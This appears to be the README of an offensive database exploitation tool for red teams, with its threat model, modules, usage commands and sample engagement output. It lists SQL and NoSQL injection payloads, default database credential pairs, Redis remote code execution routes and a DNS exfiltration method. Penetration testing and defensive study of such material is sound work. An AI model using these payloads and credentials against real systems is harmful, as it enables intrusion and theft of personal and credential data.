# VaultBreaker — Database Offensive Framework

**Full-chain database exploitation: from SQL injection to credential extraction to data exfiltration, across six database engines in a single engagement.**

---

## Threat Model

Every breach ends at a database. The path from initial foothold to data extraction crosses multiple database technologies, each with its own attack surface. VaultBreaker maps this reality:

| Threat Vector | Real-World Prevalence | Impact |
|---|---|---|
| Databases deployed with default credentials | Root/sa/postgres accounts ship with blank or trivial passwords; production instances routinely run unchanged | Full administrative access, hash extraction, data dump |
| Unauthenticated Redis/MongoDB/Elasticsearch | Default configurations bind to 0.0.0.0 with no authentication; cloud misconfigurations expose them to the internet | Complete data access, RCE via Redis CONFIG SET, cluster enumeration |
| SQL injection in web application parameters | OWASP Top 10 perennial; present in legacy apps, custom APIs, and misconfigured ORMs | Database fingerprinting, schema extraction, data exfiltration, potential OS command execution |
| Credential reuse across database instances | Operators reuse passwords across MySQL, PostgreSQL, MSSQL instances on the same network | Lateral movement across database tier; one credential compromises multiple engines |
| Sensitive data stored without encryption | PII, credentials, API keys stored in plaintext columns; no column-level encryption | Direct data theft without cryptographic overhead |

### MITRE ATT&CK Mapping

| Tactic | Technique | VaultBreaker Coverage |
|---|---|---|
| **TA0001** Initial Access | T1190 Exploit Public-Facing Application | SQLi exploitation, NoSQL injection via HTTP parameters |
| **TA0001** Initial Access | T1133 External Remote Services | MongoDB/Redis/Elasticsearch unauthenticated access |
| **TA0006** Credential Access | T1552 Unsecured Credentials | Default credential testing, config file scanning, hash extraction |
| **TA0009** Collection | T1005 Data from Local System | Database enumeration, sensitive column detection, document sampling |
| **TA0009** Collection | T1039 Data from Network Shared Drive | Cross-database schema mapping, snapshot repository enumeration |
| **TA0010** Exfiltration | T1048 Exfiltration Over Alternative Protocol | DNS exfiltration encoding, selective data extraction |

### CWE Coverage

| CWE | Description | Module |
|---|---|---|
| CWE-89 | SQL Injection | `sqli` — error/time/boolean/UNION/stacked query detection |
| CWE-943 | NoSQL Injection | `mongo` — operator injection, JSON body bypass |
| CWE-306 | Missing Authentication | `mongo`, `redis`, `elastic` — unauthenticated access checks |
| CWE-521 | Weak Password Requirements | `cred`, `redis` — default credential testing, AUTH brute-force |
| CWE-312 | Cleartext Storage of Sensitive Info | `exfil` — plaintext password/PII/API key detection in columns |
| CWE-200 | Exposure of Sensitive Information | `elastic`, `cred` — index data sampling, connection string leaks |

---

## Why This Exists

Databases are the terminal objective of every intrusion. An attacker who reaches the database tier owns the organization's crown jewels: customer records, financial data, authentication secrets, business logic.

Existing tools handle fragments of this problem. sqlmap does SQL injection. mongosh enumerates MongoDB. redis-cli pokes at Redis. None of them chain the full offensive path — from injection point discovery through credential harvesting to targeted data extraction — across the six database engines that dominate production infrastructure.

VaultBreaker closes that gap. A single engagement context carries discovered credentials forward from the credential module into the exfiltration module. A MongoDB unauthenticated access finding feeds directly into document sampling. A Redis CONFIG GET result immediately informs RCE vector assessment. The framework thinks in attack chains, not isolated checks.

Built for red team operators running authorized assessments against large-scale enterprise environments where the database tier spans MySQL, PostgreSQL, MSSQL, MongoDB, Redis, and Elasticsearch — often simultaneously, often with overlapping credentials, often with configurations that haven't been reviewed since initial deployment.

---

## Capabilities

### Module 1: SQL Injection (`sqli`)

Comprehensive SQL injection exploitation across five database engines.

| Technique | Method | Engines |
|---|---|---|
| Error-Based Detection | Inject `'`, `"`, `')`, `")` and match engine-specific error patterns | MySQL, MSSQL, PostgreSQL, Oracle, SQLite |
| Time-Based Blind | `SLEEP()`, `WAITFOR DELAY`, `pg_sleep()`, `randomblob()` with response timing | MySQL, MSSQL, PostgreSQL, SQLite |
| Boolean-Based Blind | `AND 1=1` vs `AND 1=2` response differential analysis | All |
| UNION-Based | Column count fuzzing via `ORDER BY`, NULL injection, version extraction | All |
| Stacked Queries | Semicolon-separated secondary query execution detection | MySQL, MSSQL, PostgreSQL |
| WAF Detection | Obvious payload trigger, 403/header analysis, signature matching | ModSecurity, Cloudflare, Incapsula, Akamai, Imperva, F5, Barracuda, FortiWeb, Wallarm |

Supports GET parameter injection and POST body injection (both form-encoded and JSON).

### Module 2: MongoDB (`mongo`)

| Capability | Detail |
|---|---|
| Unauthenticated Access | Direct connection to port 27017 without credentials |
| Database/Collection Enumeration | `list_database_names()`, `list_collection_names()` |
| NoSQL Injection (JSON POST) | `{"$ne": ""}`, `{"$gt": ""}`, `{"$regex": ".*"}`, `{"$exists": true}` operator injection |
| NoSQL Injection (GET params) | `username[$ne]=&password[$ne]=` parameter pollution |
| Server Info Extraction | `buildInfo`, `serverStatus`, `hostInfo` command execution |
| User Enumeration | `admin.system.users` collection read |
| Document Sampling | First 5 documents per collection with field enumeration |

### Module 3: Redis (`redis`)

| Capability | Detail |
|---|---|
| Unauthenticated Access | Raw `INFO` command without AUTH |
| AUTH Brute-Force | 17 common passwords including blank, redis, password, admin, root |
| Server Info | Version, OS, connected clients, memory usage, keyspace statistics |
| Key Enumeration | `SCAN`-based iteration, TYPE per key, value sampling for strings/hashes/lists/sets |
| Dangerous Command Detection | CONFIG, DEBUG, EVAL, SCRIPT, SLAVEOF, REPLICAOF, MODULE availability |
| RCE Vectors | CONFIG SET for crontab write, SSH authorized_keys injection, webshell deployment |
| Lua Execution | `EVAL` script capability verification |
| Replication Attack | SLAVEOF/REPLICAOF command availability for rogue master |

### Module 4: Elasticsearch (`elastic`)

| Capability | Detail |
|---|---|
| Unauthenticated Access | `GET /` cluster name, version, tagline extraction |
| Cluster/Node Info | `/_cluster/health`, `/_nodes` with OS, JVM, IP details |
| Index Enumeration | `/_cat/indices?v` with document counts and storage sizes |
| Sensitive Index Detection | Flags indices containing: user, customer, payment, credential, password, session, token, log, audit, secret, admin, account, auth, credit, ssn, email, private, key, cert, config |
| Document Sampling | First 5 documents from flagged indices via `_search` |
| Kibana Detection | Port 5601 `/api/status` check |
| Snapshot Enumeration | `/_snapshot` repository listing with type and location |
| Security Plugin Detection | X-Pack, OpenSearch Security, SearchGuard |

### Module 5: Credential Extraction (`cred`)

| Database | Default Credentials Tested | Post-Auth Extraction |
|---|---|---|
| MySQL | root:root, root:mysql, root:password, root:(blank), admin:admin, mysql:mysql, root:toor, root:123456, dbadmin:dbadmin | `mysql.user` — username, host, authentication_string (SHA1 hash) |
| PostgreSQL | postgres:postgres, postgres:password, admin:admin, postgres:(blank), postgres:123456, pgsql:pgsql | `pg_shadow` — usename, passwd (MD5 hash) |
| MSSQL | sa:sa, sa:password, sa:(blank), sa:Password1, sa:sa123, sa:123456 | `sys.sql_logins` — name, password_hash |

Additional capabilities:
- Connection string pattern scanning in HTTP responses (JDBC, MongoDB, Redis, PostgreSQL URI formats)
- Config file exposure testing: `.env`, `wp-config.php`, `configuration.php`, `database.php`, `.git/config`, `web.config`
- Path traversal prefix testing for config file access

### Module 6: Data Exfiltration (`exfil`)

| Capability | Detail |
|---|---|
| Database Enumeration | List all databases/schemas via discovered credentials |
| Table Assessment | Row counts and column enumeration per table |
| Sensitive Column Detection | Flags columns matching: password, credit_card, ssn, email, phone, address, token, secret, api_key, private, hash, session, cookie, auth, credential, bank |
| Selective Extraction | Dumps only flagged sensitive columns (first N rows) |
| Export Formats | JSON report, CSV extraction |
| DNS Exfiltration | Base32-encoded data chunked into DNS subdomain queries |

---

## Architecture

```
                        ┌──────────────────────┐
                        │     CLI Interface     │
                        │  argparse + Rich UI   │
                        └──────────┬───────────┘
                                   │
                        ┌──────────▼───────────┐
                        │  EngagementContext    │
                        │  targets, ports,      │
                        │  credentials, results │
                        └──────────┬───────────┘
                                   │
              ┌────────────────────┼────────────────────┐
              │                    │                    │
     ┌────────▼──────┐   ┌───────▼────────┐   ┌──────▼───────┐
     │  SQLi Module  │   │  Mongo Module  │   │ Redis Module │
     │  error/time/  │   │  unauth/nosql/ │   │ unauth/brute │
     │  bool/union/  │   │  enum/js-inj   │   │ rce/keys/lua │
     │  stacked/waf  │   │  user-enum     │   │ replication  │
     └───────────────┘   └────────────────┘   └──────────────┘
              │                    │                    │
     ┌────────▼──────┐   ┌───────▼────────┐   ┌──────▼───────┐
     │Elastic Module │   │ CredExtract    │   │ Exfil Module │
     │  unauth/index │   │  default-creds │   │ enum/detect  │
     │  sample/snap  │   │  hash-extract  │   │ extract/dns  │
     │  kibana/xpack │   │  config-scan   │   │ csv/json     │
     └───────────────┘   └────────────────┘   └──────────────┘
                                   │
                          credentials flow
                          into exfil module
```

---

## Attack Flow

1. **Target Specification** — Operator provides target hosts/URLs, ports, and selects modules
2. **WAF Detection** — SQLi module probes for web application firewalls before injection attempts
3. **Injection Discovery** — Error-based, time-based, boolean-based, UNION-based, and stacked query injection across five SQL dialects; NoSQL operator injection against MongoDB HTTP endpoints
4. **Unauthenticated Access** — Direct connection attempts to MongoDB (27017), Redis (6379), Elasticsearch (9200) without credentials
5. **Credential Harvesting** — Default credential testing against MySQL, PostgreSQL, MSSQL; Redis AUTH brute-force; connection string scanning in HTTP responses and config files
6. **Post-Authentication Enumeration** — Database/schema/table/collection listing; user and hash extraction from system tables; server info and cluster topology mapping
7. **Sensitive Data Detection** — Column-name and index-name pattern matching for PII, credentials, financial data, API keys
8. **Selective Extraction** — Targeted dump of flagged sensitive columns; document sampling from flagged Elasticsearch indices and MongoDB collections
9. **Reporting** — JSON output with severity-classified findings, extracted credentials, and engagement summary

---

## Usage

### Full engagement against a single target

```bash
python vaultbreaker.py --targets 10.0.0.5 --modules all --output report.json --yes
```

### SQL injection assessment against a web application

```bash
python vaultbreaker.py --targets "http://app.corp.local/search?q=test" --modules sqli --db-type mysql
```

### NoSQL database sweep across a network segment

```bash
python vaultbreaker.py --targets 10.0.0.10,10.0.0.11,10.0.0.12 \
    --ports 27017,6379,9200 \
    --modules mongo,redis,elastic \
    --output nosql-audit.json --yes
```

### Credential extraction and exfiltration chain

```bash
python vaultbreaker.py --targets db.internal.corp \
    --ports 3306,5432,1433 \
    --modules cred,exfil \
    --db-type auto \
    --output cred-report.json --yes
```

### Redis-specific assessment

```bash
python vaultbreaker.py --targets redis-01.corp.local \
    --ports 6379 \
    --modules redis \
    --timeout 15 --yes
```

### Elasticsearch cluster audit

```bash
python vaultbreaker.py --targets elastic-node1.corp.local,elastic-node2.corp.local \
    --ports 9200 \
    --modules elastic \
    --output elastic-audit.json --yes
```

---

## Output

### Terminal output during an engagement

```
 _    __            ____  ____                  __
| |  / /___ ___  __/ / /_/ __ )________  ____ _/ /_____  _____
| | / / __ `/ / / / / __/ __  / ___/ _ \/ __ `/ //_/ _ \/ ___/
| |/ / /_/ / /_/ / / /_/ /_/ / /  /  __/ /_/ / ,< /  __/ /
|___/\__,_/\__,_/_/\__/_____/_/   \___/\__,_/_/|_|\___/_/

  VaultBreaker Framework v1.0.0
  Database Offensive Framework
  SQL Injection | MongoDB | Redis | Elasticsearch | Credential Extraction | Exfiltration

  [INFO] Targets: 10.0.0.5
  [INFO] Ports: auto
  [INFO] Modules: sqli, mongo, redis, elastic, cred, exfil
  [INFO] DB Type: auto
  [INFO] Timeout: 10s

━━━ SQLi Module ━━━

  [INFO] Target: http://10.0.0.5
  [OK] [INFO] WAF Detection: No WAF detected on obvious payload
  [CRIT] [CRITICAL] Error-Based Detection: SQL error from MYSQL with payload: '
  [CRIT] [CRITICAL] Time-Based Blind: MYSQL time-based confirmed (delay=5.2s) payload: ' OR SLEEP(5)-- -
  [CRIT] [HIGH] Boolean-Based Blind: Response length differential: 847 chars (true=3291, false=2444)
  [CRIT] [CRITICAL] UNION-Based: UNION injection confirmed: 4 columns, version: 5.7.42
  [CRIT] [CRITICAL] Stacked Queries: Stacked query execution confirmed (delay=5.1s): ';SELECT SLEEP(5)-- -

━━━ MongoDB Module ━━━

  [INFO] Target: 10.0.0.5:27017
  [CRIT] [CRITICAL] Unauthenticated Access: MongoDB 6.0.12 open without authentication
  [OK] [HIGH] Database Enumeration: Found 5 databases: admin, local, config, webapp, analytics
  [OK] [MEDIUM] Collection Enumeration: webapp: 8 collections — users, sessions, orders, products, payments, logs, configs, api_keys
  [OK] [HIGH] Document Sampling: webapp.users: 5 docs sampled, fields: _id, username, email, password_hash, role, created_at
  [OK] [CRITICAL] User Enumeration: Found 3 users: admin@admin, appuser@webapp, readonly@analytics

━━━ Redis Module ━━━

  [INFO] Target: 10.0.0.5:6379
  [CRIT] [CRITICAL] Unauthenticated Access: Redis 7.2.3 accessible without authentication
  [OK] [MEDIUM] Server Info: version=7.2.3, os=Linux, clients=14, memory=28.5M, keys=4721
  [OK] [HIGH] Key Enumeration: Found 500 keys (sample): session:a8f2..., user:1001, user:1002, token:admin, config:db, cache:products...
  [OK] [MEDIUM] Key Value Sample: session:a8f2e9c1 [string] = {"user_id": 1001, "role": "admin", "token": "eyJ..."}
  [CRIT] [HIGH] Dangerous Commands: Available dangerous commands: CONFIG, DEBUG, EVAL, SCRIPT, SLAVEOF
  [CRIT] [CRITICAL] RCE Vectors: Available RCE paths: CONFIG SET (crontab/SSH key/webshell write); EVAL (Lua script execution); SLAVEOF (replication attack)

━━━ Elasticsearch Module ━━━

  [INFO] Target: http://10.0.0.5:9200
  [CRIT] [CRITICAL] Unauthenticated Access: Elasticsearch 8.11.3 open — cluster: prod-cluster, tagline: You Know, for Search
  [OK] [MEDIUM] Cluster Health: status=yellow, nodes=3, indices=47, unassigned=2
  [OK] [HIGH] Node Info: node=es-node-01, ip=10.0.0.5, version=8.11.3, os=Ubuntu 22.04, jvm=17.0.9
  [OK] [HIGH] Index Enumeration: Found 47 indices
  [CRIT] [HIGH] Sensitive Index Detected: Index 'customer_data' — 1284930 docs, size: 2.1gb
  [CRIT] [HIGH] Sensitive Index Detected: Index 'payment_logs' — 89421 docs, size: 340mb
  [CRIT] [HIGH] Sensitive Index Detected: Index 'user_sessions' — 42001 docs, size: 128mb
  [OK] [CRITICAL] Document Sampling: customer_data: 5 docs sampled, fields: customer_id, name, email, phone, ssn, address, credit_card_last4
  [WARN] [INFO] Kibana Detection: Kibana not detected on port 5601

━━━ Credential Extraction Module ━━━

  [INFO] Target: 10.0.0.5
  [CRIT] [CRITICAL] MySQL Default Creds: Login successful: root:root@10.0.0.5:3306
  [CRED] mysql-default → root:root@10.0.0.5:3306/
  [OK] [CRITICAL] MySQL Hash Extraction: root@localhost hash=*81F5E21E35407D884A6CD4A731AEBFB6AF2...
  [OK] [MEDIUM] Hash Format: root: MySQL 4.1+ (SHA1) hash detected
  [OK] [CRITICAL] MySQL Hash Extraction: webapp@% hash=*A4B6157319038724E3560894F7F932C8886...
  [WARN] [INFO] PostgreSQL Default Creds: No default credentials worked on 10.0.0.5:5432
  [WARN] [INFO] MSSQL Default Creds: No default credentials worked on 10.0.0.5:1433

━━━ Exfiltration Module ━━━

  [INFO] Using credential: root@10.0.0.5:3306 (mysql-default)
  [OK] [HIGH] MySQL Database Enumeration: Found 6 databases: information_schema, mysql, performance_schema, sys, webapp_prod, analytics
  [CRIT] [CRITICAL] Sensitive Data Detected: webapp_prod.users: 12840 rows, sensitive columns: password_hash, email, phone
  [OK] [CRITICAL] Data Sample: webapp_prod.users row 1: {"password_hash": "$2b$12$LJ3m5...", "email": "admin@corp.local", "phone": "+1-555-0101"}
  [CRIT] [CRITICAL] Sensitive Data Detected: webapp_prod.api_credentials: 47 rows, sensitive columns: api_key, secret, token
  [OK] [CRITICAL] Data Sample: webapp_prod.api_credentials row 1: {"api_key": "sk-live-4eC39HqLyjWDarjtT1zdp7dc", "secret": "whsec_...", "token": "xoxb-..."}

  [INFO] Completed in 34.7s

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃      Engagement Summary        ┃
┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
│ Total Findings       │ 38      │
│ Critical             │ 14      │
│ High                 │ 9       │
│ Medium               │ 7       │
│ Low                  │ 1       │
│ Info                 │ 7       │
│ Credentials Extracted│ 1       │
└──────────────────────┴─────────┘

  [INFO] Results written to report.json
```

### JSON report structure

```json
{
  "tool": "VaultBreaker Framework",
  "version": "1.0.0",
  "timestamp": "2025-03-15T14:32:18.441Z",
  "targets": ["10.0.0.5"],
  "results": [
    {
      "module": "sqli",
      "action": "Error-Based Detection",
      "status": "critical",
      "severity": "critical",
      "notes": "SQL error from MYSQL with payload: '",
      "timestamp": "2025-03-15T14:32:19.102Z"
    }
  ],
  "credentials": [
    {
      "source": "mysql-default",
      "username": "root",
      "password": "root",
      "database": "",
      "host": "10.0.0.5",
      "port": 3306
    }
  ],
  "summary": {
    "total": 38,
    "critical": 14,
    "high": 9,
    "medium": 7,
    "low": 1,
    "info": 7
  }
}
```

---

## Legal Notice

This software is provided for use in authorized security assessments and penetration testing engagements only. The operator is solely responsible for ensuring they have explicit written permission before testing any target system.

Unauthorized access to computer systems, networks, and data is a criminal offense under the Computer Fraud and Abuse Act (18 U.S.C. 1030), the Computer Misuse Act 1990, EU Directive 2013/40/EU, and equivalent legislation worldwide.

The authors and contributors of this tool assume no liability for misuse, damage, or legal consequences resulting from its use. By using this software, you acknowledge that you understand and accept full legal responsibility for your actions.

This tool does not bypass or defeat security controls — it identifies weaknesses in database configurations and application code that an attacker would find. If VaultBreaker finds something, an adversary already could.
